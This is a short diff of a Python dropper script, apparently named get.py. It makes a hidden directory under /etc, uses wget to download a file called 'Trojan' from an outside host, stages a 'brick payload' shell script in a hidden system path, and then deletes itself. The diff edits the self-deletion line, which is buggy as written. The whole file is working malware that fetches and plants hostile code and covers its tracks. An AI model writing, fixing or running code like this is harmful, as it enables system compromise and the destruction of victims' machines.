@@ -1,6 +1,7 @@
 import os
 import subprocess
 def main():
+    directory = os.getcwd()
     os.system("mkdir /etc/.a")
     os.system("wget -P /etc/.a -r -l 2 https://files.ravenn.net/horror/Trojan")
     os.system("mv /etc/.a/files.ravenn.net/horror/Trojan /etc/.a")
@@ -10,5 +11,5 @@ def main():
     print("Install complete. Preping brick payload.")
     os.system("mv /etc/.a/horror/files.ravenn.net/horror/brickPayload.sh /etc/.music")
     print("Total completion. Goodbye")
-    os.system("rm -- \"$0\"")
+    os.system("rm {directory}/get.py")
 main()
